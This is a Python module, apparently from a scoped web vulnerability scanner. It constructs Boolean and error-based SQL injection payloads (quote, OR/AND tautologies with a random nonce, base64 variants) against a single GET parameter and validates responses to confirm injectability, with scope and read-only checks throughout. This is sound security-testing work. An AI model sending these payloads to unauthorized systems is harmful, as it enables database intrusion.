"""Conservative Boolean SQLi proof for an observed string-valued GET field.

The OR recipe uses eight bounded, read-only requests. A stable baseline can
trigger six additional AND controls. An independent verifier must repeat the
successful recipe with a fresh nonce before a candidate can be published.
"""

from __future__ import annotations

import base64
import binascii
import re
import secrets
from collections.abc import Callable
from urllib.parse import quote, unquote_plus, urlsplit, urlunsplit

from .browser import assert_in_scope, origin
from .browser_actions import allowed_discovery_path
from .http_observe import observe_get


CHECK_ORDER = (
    "baseline_first", "quote_error", "escaped_quote", "true_first",
    "false_first", "true_second", "false_second", "baseline_last",
)
AND_CHECK_ORDER = (
    "baseline_first", "true_first", "false_first", "true_second",
    "false_second", "baseline_last",
)
ERROR_CHECK_ORDER = (
    "baseline_first", "quote_first", "escaped_quote", "quote_second", "baseline_last",
)
_SAFE_VALUE = re.compile(r"[A-Za-z][A-Za-z0-9 _-]{0,39}\Z")
_DIGEST = re.compile(r"[0-9a-f]{64}\Z")


def _observed_value(raw_value: str) -> tuple[str, str]:
    """Decode a canonical base64 string only when it contains an ordinary value."""
    value = unquote_plus(raw_value)
    if len(value) >= 8 and re.fullmatch(r"[A-Za-z0-9+/]+={0,2}", value):
        try:
            decoded = base64.b64decode(value, validate=True).decode("utf-8")
            if (base64.b64encode(decoded.encode()).decode() == value
                    and _SAFE_VALUE.fullmatch(decoded)):
                return decoded, "base64"
        except (ValueError, UnicodeDecodeError, binascii.Error):
            pass
    return value, "plain"


def observed_query_encoding(url: str, parameter: str) -> str:
    """Describe the one observed query value without exposing its contents."""
    fields = urlsplit(url).query.split("&")
    matches = [field.partition("=")[2] for field in fields
               if field and unquote_plus(field.partition("=")[0]) == parameter]
    return _observed_value(matches[0])[1] if len(matches) == 1 else "plain"


def plan_string_boolean(
    url: str, *, parameter: str, allowed_origins: list[str],
) -> tuple[str, dict[str, str], str]:
    """Change only one observed, ordinary string field; preserve other query bytes."""
    assert_in_scope(url, allowed_origins)
    parts = urlsplit(url)
    if parts.fragment or len(url) > 2048 or len(parts.query) > 2048:
        raise ValueError("A bounded fragment-free observed GET URL is required")
    if not allowed_discovery_path(parts.path or "/"):
        raise ValueError("State-changing path is not eligible for SQLi proof")
    fields = parts.query.split("&")
    if len(fields) > 40 or not isinstance(parameter, str) or not 0 < len(parameter) <= 80:
        raise ValueError("A single bounded query parameter is required")
    matches = [i for i, field in enumerate(fields)
               if field and unquote_plus(field.split("=", 1)[0]) == parameter]
    if len(matches) != 1:
        raise ValueError("String parameter must occur exactly once")
    index = matches[0]
    name, sep, raw_value = fields[index].partition("=")
    value, encoding = _observed_value(raw_value) if sep else ("", "plain")
    if not _SAFE_VALUE.fullmatch(value):
        raise ValueError("Boolean SQLi proof requires an ordinary observed string value")
    nonce = str(secrets.randbelow(90000) + 10000)
    false_nonce = nonce[:-1] + str((int(nonce[-1]) + 1) % 10)

    def variant(suffix: str) -> str:
        changed = fields.copy()
        if encoding == "base64":
            decoded_suffix = unquote_plus(suffix)
            encoded = base64.b64encode((value + decoded_suffix).encode()).decode()
            changed[index] = name + "=" + quote(encoded, safe="")
        else:
            changed[index] = name + "=" + raw_value + suffix
        target = urlunsplit(parts._replace(query="&".join(changed)))
        assert_in_scope(target, allowed_origins)
        return target

    variants = {
        "baseline_first": url,
        "quote_error": variant("%27"),
        "escaped_quote": variant("%27%27"),
        "true_first": variant(f"%27%20OR%20%27{nonce}%27%3D%27{nonce}%27--%20"),
        "false_first": variant(f"%27%20OR%20%27{nonce}%27%3D%27{false_nonce}%27--%20"),
    }
    variants["true_second"] = variants["true_first"]
    variants["false_second"] = variants["false_first"]
    variants["baseline_last"] = url
    return url, variants, nonce


def plan_string_and_boolean(
    url: str, *, parameter: str, allowed_origins: list[str],
) -> tuple[str, dict[str, str], str]:
    """Use the same observed value with a repeated true/false AND condition."""
    baseline, _, nonce = plan_string_boolean(
        url, parameter=parameter, allowed_origins=allowed_origins,
    )
    parts = urlsplit(baseline)
    fields = parts.query.split("&")
    index = next(i for i, field in enumerate(fields)
                 if field and unquote_plus(field.split("=", 1)[0]) == parameter)
    name, _, raw_value = fields[index].partition("=")
    value, encoding = _observed_value(raw_value)
    false_nonce = nonce[:-1] + str((int(nonce[-1]) + 1) % 10)

    def variant(other: str) -> str:
        changed = fields.copy()
        suffix = f"%27%20AND%20%27{nonce}%27%3D%27{other}%27--%20"
        changed[index] = (name + "=" + quote(
            base64.b64encode((value + unquote_plus(suffix)).encode()).decode(), safe="",
        ) if encoding == "base64" else name + "=" + raw_value + suffix)
        target = urlunsplit(parts._replace(query="&".join(changed)))
        assert_in_scope(target, allowed_origins)
        return target

    true_url, false_url = variant(nonce), variant(false_nonce)
    return baseline, {
        "baseline_first": baseline,
        "true_first": true_url,
        "false_first": false_url,
        "true_second": true_url,
        "false_second": false_url,
        "baseline_last": baseline,
    }, nonce


def and_fallback_eligible(result: dict) -> bool:
    """Run a second pattern only after the original response is stable."""
    if result.get("proof_recipe") != "string_or_boolean_v1":
        return False
    checks = result.get("checks")
    if not isinstance(checks, dict):
        return False
    first, last = checks.get("baseline_first"), checks.get("baseline_last")
    if not isinstance(first, dict) or not isinstance(last, dict):
        return False
    if any(row.get("status") != 200 or row.get("redirected") is not False
           or row.get("truncated") is not False
           or not isinstance(row.get("bytes_captured"), int)
           for row in (first, last)):
        return False
    if not first.get("content_type") or first["content_type"] != last.get("content_type"):
        return False
    return abs(first["bytes_captured"] - last["bytes_captured"]) <= max(
        64, max(first["bytes_captured"], last["bytes_captured"]) // 100,
    )


def error_followup_eligible(result: dict) -> bool:
    """Repeat a quote-triggered database diagnostic before treating it as proof."""
    if not and_fallback_eligible(result):
        return False
    checks = result["checks"]
    family = checks.get("quote_error", {}).get("sql_error_family")
    return (isinstance(family, str) and bool(family)
            and not checks.get("baseline_first", {}).get("sql_error_family")
            and not checks.get("escaped_quote", {}).get("sql_error_family")
            and not checks.get("baseline_last", {}).get("sql_error_family"))


def string_error_proof_valid(result: dict) -> bool:
    if (result.get("operation") != "sqli_error_string"
            or result.get("proof_recipe") != "string_error_v1"
            or result.get("method") != "GET" or result.get("location") != "query"
            or not result.get("target") or not result.get("parameter")
            or result.get("requests_sent") != len(ERROR_CHECK_ORDER)):
        return False
    checks = result.get("checks")
    if not isinstance(checks, dict) or any(not isinstance(checks.get(key), dict)
                                            for key in ERROR_CHECK_ORDER):
        return False
    rows = {key: checks[key] for key in ERROR_CHECK_ORDER}
    if any(row.get("truncated") is not False or row.get("redirected") is not False
           or not _DIGEST.fullmatch(str(row.get("body_sha256", "")))
           or not isinstance(row.get("bytes_captured"), int)
           for row in rows.values()):
        return False
    normal = (rows["baseline_first"], rows["escaped_quote"], rows["baseline_last"])
    errors = (rows["quote_first"], rows["quote_second"])
    if any(row.get("status") != 200 or row.get("sql_error_family") for row in normal):
        return False
    family = errors[0].get("sql_error_family")
    if family not in {"postgresql", "mysql", "sqlite", "oracle", "sqlserver"} \
            or family != errors[1].get("sql_error_family"):
        return False
    if (errors[0].get("status") != errors[1].get("status")
            or errors[0].get("status") not in {200, 500, 501, 502, 503, 504}):
        return False
    if not normal[0].get("content_type") or any(
        row.get("content_type") != normal[0]["content_type"] for row in normal
    ):
        return False
    if not errors[0].get("content_type") or errors[0]["content_type"] != errors[1].get("content_type"):
        return False
    stable = lambda a, b: abs(a - b) <= max(64, max(a, b) // 100)
    return (stable(normal[0]["bytes_captured"], normal[2]["bytes_captured"])
            and stable(errors[0]["bytes_captured"], errors[1]["bytes_captured"]))


def _and_sql_proof_valid(result: dict) -> bool:
    checks = result.get("checks")
    if not isinstance(checks, dict) or not all(
        isinstance(checks.get(key), dict) for key in AND_CHECK_ORDER
    ):
        return False
    rows = {key: checks[key] for key in AND_CHECK_ORDER}
    if any(row.get("status") != 200 or row.get("truncated") is not False
           or row.get("redirected") is not False
           or not _DIGEST.fullmatch(str(row.get("body_sha256", "")))
           or not isinstance(row.get("bytes_captured"), int)
           for row in rows.values()):
        return False
    content_type = rows["baseline_first"].get("content_type")
    if not content_type or any(row.get("content_type") != content_type
                               for row in rows.values()):
        return False
    size = lambda key: rows[key]["bytes_captured"]
    stable = lambda first, second: abs(first - second) <= max(
        64, max(first, second) // 100,
    )
    if not (stable(size("baseline_first"), size("baseline_last"))
            and stable(size("true_first"), size("true_second"))
            and stable(size("false_first"), size("false_second"))
            and stable(size("baseline_first"), size("true_first"))):
        return False
    # Equal-length true/false payloads must cause a substantial, repeated
    # result contraction. Reflection alone cannot satisfy this size control.
    true_size = min(size("true_first"), size("true_second"))
    false_size = max(size("false_first"), size("false_second"))
    return (true_size - false_size >= max(256, true_size // 10)
            and rows["true_first"]["body_sha256"] != rows["false_first"]["body_sha256"])


def _json_rows_sql_proof_valid(result: dict) -> bool:
    """Confirm a small JSON result-set expansion with exact negative controls."""
    if result.get("requests_sent") != len(CHECK_ORDER):
        return False
    checks = result.get("checks")
    if not isinstance(checks, dict) or not all(
        isinstance(checks.get(key), dict) for key in CHECK_ORDER
    ):
        return False
    rows = {key: checks[key] for key in CHECK_ORDER}
    normal = [row for key, row in rows.items() if key != "quote_error"]
    if any(row.get("status") != 200 or row.get("content_type") != "application/json"
           or row.get("truncated") is not False or row.get("redirected") is not False
           or not _DIGEST.fullmatch(str(row.get("body_sha256", "")))
           or not isinstance(row.get("json_array_lengths"), dict)
           for row in normal):
        return False
    quote = rows["quote_error"]
    if (quote.get("status") not in {400, 422, 500, 501, 502, 503, 504}
            or quote.get("truncated") is not False or quote.get("redirected") is not False
            or not _DIGEST.fullmatch(str(quote.get("body_sha256", "")))):
        return False
    hashes = {key: row["body_sha256"] for key, row in rows.items()}
    if (hashes["baseline_first"] != hashes["baseline_last"]
            or hashes["baseline_first"] != hashes["false_first"]
            or hashes["false_first"] != hashes["false_second"]
            or hashes["true_first"] != hashes["true_second"]
            or hashes["true_first"] == hashes["baseline_first"]):
        return False
    for collection in ("results", "items", "records", "data"):
        counts = [row.get("json_array_lengths", {}).get(collection) for row in normal]
        if not all(type(count) is int and 0 <= count < 1000 for count in counts):
            continue
        baseline = rows["baseline_first"]["json_array_lengths"][collection]
        if (rows["baseline_last"]["json_array_lengths"][collection] == baseline
                and rows["false_first"]["json_array_lengths"][collection] == baseline
                and rows["false_second"]["json_array_lengths"][collection] == baseline
                and rows["escaped_quote"]["json_array_lengths"][collection] <= baseline
                and rows["true_first"]["json_array_lengths"][collection] > baseline
                and rows["true_second"]["json_array_lengths"][collection]
                    == rows["true_first"]["json_array_lengths"][collection]):
            return True
    return False


def string_sql_proof_valid(result: dict) -> bool:
    if result.get("operation") != "sqli_boolean_string" or result.get("proof_recipe") not in {
        "string_or_boolean_v1", "string_and_boolean_v1", "string_or_json_rows_v1",
    }:
        return False
    if (result.get("method") != "GET" or result.get("location") != "query"
            or not result.get("target") or not result.get("parameter")
            or result.get("input_encoding", "plain") not in {"plain", "base64"}
            or not re.fullmatch(r"[1-9][0-9]{4}", str(result.get("nonce", "")))):
        return False
    if result["proof_recipe"] == "string_and_boolean_v1":
        return _and_sql_proof_valid(result)
    if result["proof_recipe"] == "string_or_json_rows_v1":
        return _json_rows_sql_proof_valid(result)
    checks = result.get("checks")
    if not isinstance(checks, dict) or not all(isinstance(checks.get(key), dict) for key in CHECK_ORDER):
        return False
    rows = {key: checks[key] for key in CHECK_ORDER}
    if any(row.get("truncated") is not False or row.get("redirected") is not False
           or not _DIGEST.fullmatch(str(row.get("body_sha256", "")))
           or not isinstance(row.get("bytes_captured"), int) for row in rows.values()):
        return False
    success = [rows[key] for key in CHECK_ORDER if key != "quote_error"]
    if any(row.get("status") != 200 for row in success):
        return False
    if not 500 <= rows["quote_error"].get("status", 0) < 600:
        return False
    if not success[0].get("content_type") or any(
        row.get("content_type") != success[0]["content_type"] for row in success
    ):
        return False
    # HTML commonly contains changing CSRF or tracking tokens. Require the
    # repeated response sizes to remain stable instead of whole-body hashes.
    size = lambda key: rows[key]["bytes_captured"]
    stable = lambda first, second: abs(first - second) <= max(64, max(first, second) // 100)
    if not (stable(size("baseline_first"), size("baseline_last"))
            and stable(size("true_first"), size("true_second"))
            and stable(size("false_first"), size("false_second"))
            and rows["true_first"]["body_sha256"] != rows["false_first"]["body_sha256"]):
        return False
    # Equal-length payloads rule out a reflected string alone as the signal.
    # The true branch must expand the result substantially in both fresh runs.
    true_size = min(size("true_first"), size("true_second"))
    controls = max(size("baseline_first"), size("false_first"), size("escaped_quote"))
    return true_size - controls >= max(512, controls // 10)


def probe_string_boolean(
    baseline: str, variants: dict[str, str], nonce: str, *, parameter: str,
    allowed_origins: list[str], storage_state: dict | None,
    before_request: Callable[[], object],
) -> dict:
    checks = {}
    for key in CHECK_ORDER:
        before_request()
        response = observe_get(variants[key], allowed_origins, storage_state)
        checks[key] = {name: response[name] for name in (
            "status", "content_type", "bytes_captured", "truncated", "body_sha256", "redirected",
        )}
        checks[key]["sql_error_family"] = response.get("sql_error_family", "")
        checks[key]["json_array_lengths"] = response.get("json_array_lengths", {})
    parts = urlsplit(baseline)
    result = {
        "operation": "sqli_boolean_string", "proof_recipe": "string_or_boolean_v1",
        "target": origin(baseline) + (parts.path or "/"),
        "method": "GET", "location": "query", "parameter": parameter,
        "nonce": nonce, "requests_sent": len(CHECK_ORDER),
        "identity_transport": "named_identity_cookies_only", "checks": checks,
        "input_encoding": observed_query_encoding(baseline, parameter),
    }
    result["proof_confirmed"] = string_sql_proof_valid(result)
    if not result["proof_confirmed"]:
        result["proof_recipe"] = "string_or_json_rows_v1"
        result["proof_confirmed"] = string_sql_proof_valid(result)
        if not result["proof_confirmed"]:
            result["proof_recipe"] = "string_or_boolean_v1"
    return result


def probe_string_and_boolean(
    baseline: str, variants: dict[str, str], nonce: str, *, parameter: str,
    allowed_origins: list[str], storage_state: dict | None,
    before_request: Callable[[], object],
) -> dict:
    checks = {}
    for key in AND_CHECK_ORDER:
        before_request()
        response = observe_get(variants[key], allowed_origins, storage_state)
        checks[key] = {name: response[name] for name in (
            "status", "content_type", "bytes_captured", "truncated", "body_sha256", "redirected",
        )}
    parts = urlsplit(baseline)
    result = {
        "operation": "sqli_boolean_string", "proof_recipe": "string_and_boolean_v1",
        "target": origin(baseline) + (parts.path or "/"),
        "method": "GET", "location": "query", "parameter": parameter,
        "nonce": nonce, "requests_sent": len(AND_CHECK_ORDER),
        "identity_transport": "named_identity_cookies_only", "checks": checks,
        "input_encoding": observed_query_encoding(baseline, parameter),
    }
    result["proof_confirmed"] = string_sql_proof_valid(result)
    return result


def probe_string_error(
    baseline: str, variants: dict[str, str], *, parameter: str,
    allowed_origins: list[str], storage_state: dict | None,
    before_request: Callable[[], object],
) -> dict:
    """Confirm a quote-only SQL diagnostic with two separated repetitions."""
    urls = (baseline, variants["quote_error"], variants["escaped_quote"],
            variants["quote_error"], baseline)
    checks = {}
    for key, url in zip(ERROR_CHECK_ORDER, urls, strict=True):
        before_request()
        response = observe_get(url, allowed_origins, storage_state)
        checks[key] = {name: response[name] for name in (
            "status", "content_type", "bytes_captured", "truncated", "body_sha256", "redirected",
        )}
        checks[key]["sql_error_family"] = response.get("sql_error_family", "")
    parts = urlsplit(baseline)
    result = {
        "operation": "sqli_error_string", "proof_recipe": "string_error_v1",
        "target": origin(baseline) + (parts.path or "/"),
        "method": "GET", "location": "query", "parameter": parameter,
        "requests_sent": len(ERROR_CHECK_ORDER),
        "identity_transport": "named_identity_cookies_only", "checks": checks,
        "input_encoding": observed_query_encoding(baseline, parameter),
    }
    result["proof_confirmed"] = string_error_proof_valid(result)
    return result
